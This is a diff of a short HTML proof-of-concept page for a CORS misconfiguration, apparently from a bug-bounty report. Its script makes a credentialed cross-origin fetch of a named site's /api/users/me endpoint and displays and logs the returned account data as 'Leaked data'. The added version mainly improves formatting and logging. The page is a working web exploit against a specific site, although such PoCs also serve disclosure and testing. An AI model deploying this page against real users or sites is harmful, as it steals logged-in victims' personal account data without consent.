@@ -1,20 +1,30 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>CORS Misconfiguration PoC</title>
+</head>
 <body>
-<h2>CORS PoC</h2>
-<div id="demo"></div>
-<script>
-fetch("https://filewale.com/api/users/me", {
-    method: "GET",
-    credentials: "include"
-})
-.then(response => response.json())
-.then(data => {
-    document.getElementById("demo").innerText = JSON.stringify(data);
-})
-.catch(error => {
-    document.getElementById("demo").innerText = "Error: " + error;
-});
-</script>
+    <h2>CORS PoC - filewale.com</h2>
+    <p>If vulnerable, sensitive account data will appear below:</p>
+    <pre id="demo">Loading...</pre>
+
+    <script>
+        fetch("https://filewale.com/api/users/me", {
+            method: "GET",
+            credentials: "include"
+        })
+        .then(response => {
+            console.log("Status:", response.status);
+            return response.json();
+        })
+        .then(data => {
+            document.getElementById("demo").innerText = JSON.stringify(data, null, 2);
+            console.log("Leaked data:", data);
+        })
+        .catch(error => {
+            document.getElementById("demo").innerText = "Error: " + error;
+            console.error("Fetch error:", error);
+        });
+    </script>
 </body>
 </html>
